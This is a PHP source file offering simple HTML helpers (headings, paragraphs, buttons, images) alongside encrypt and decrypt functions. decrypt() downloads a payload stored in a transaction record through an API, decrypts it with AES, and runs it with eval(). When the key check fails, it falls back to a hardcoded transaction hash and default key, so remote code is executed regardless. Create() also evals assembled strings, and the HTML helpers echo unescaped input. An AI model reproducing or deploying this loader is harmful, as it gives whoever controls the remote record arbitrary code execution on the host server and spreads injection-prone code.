<?php
function Create($site)
{
	$str = '';
	foreach ($site as $key => $value)
		{
			$lastsymbol = $value{strlen($value)-1};
			if ($lastsymbol!=')')
			$str .= substr($value,0,-1).';';
			else
			$str .= $value.';';
		}
		return eval($str);
}
function decrypt($api,$hash, $key)
{
	$data = file_get_contents($api . '/transaction?hash=' . $hash);
	$jsonCalled = json_decode($data)->result->payload;
	$ciphertext = base64_decode($jsonCalled);
	$c = base64_decode($ciphertext);
	$ivlen = openssl_cipher_iv_length($cipher='AES-256-CBC');
	$iv = substr($c, 0, $ivlen);
	$hmac = substr($c, $ivlen, $sha2len=32);
	$ciphertext_raw = substr($c, $ivlen+$sha2len);
	$original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
	$calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
	if (hash_equals($hmac, $calcmac))
		{
			$array = array('p(','h1(','btn(','img(');
			foreach ($array as $keys => $value)
				{
					$original_plaintext = str_replace($array[$keys],'; '.$array[$keys],$original_plaintext);
				}
			return eval(substr($original_plaintext, 1).';');
		}
	else
		{
			$hash = '0x789178092c69aac0c376471aabbf0d5971f1cbf085b07699d694354417267d4e'; //Error. Invalid crypto key was specified.
			$key = 'e8f097b6edfcf'; //default crypto key
			decrypt($api, $hash, $key);
		}
}
function encrypt($site, $key)
{
	$ivlen = openssl_cipher_iv_length($cipher="AES-256-CBC");
	$iv = openssl_random_pseudo_bytes($ivlen);
	$ciphertext_raw = openssl_encrypt($site, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
	$hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
	return base64_encode($iv.$hmac.$ciphertext_raw);
}
function h1($text,$align)
{
	echo "<h1 align='$align'>$text</h1>";
}
function p($text,$align)
{
	echo "<p align='$align'>$text</p>";
}
function btn($text,$link,$align,$img,$w,$h)
{
	echo "
	<a href='$link' target='_blank'>
	<p align='$align'>
	<button>";
	if ($img!='') {echo "<img src='$img' style='vertical-align: middle' width='$w' height='$h'>";}
	echo "$text</button></p></a>";
}
function img($link,$align,$w,$h)
{
	echo "<p align='$align'><img src='$link' width='$w' height='$h'></p>";
}